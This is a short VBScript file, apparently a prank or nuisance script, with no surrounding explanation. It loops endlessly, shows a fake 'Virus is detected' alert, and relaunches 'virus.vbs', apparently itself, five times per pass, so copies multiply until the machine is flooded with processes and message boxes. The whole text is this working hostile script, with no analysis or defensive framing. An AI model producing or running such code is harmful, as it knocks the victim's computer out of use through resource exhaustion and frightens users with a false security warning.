do
X=MsgBox("Virus is detected",1+16,"Alert")
Set x=WScript.CreateObject("WScript.Shell")
for i = 1 to 5
x.Run"virus.vbs"
wscript.sleep 500
next 
loop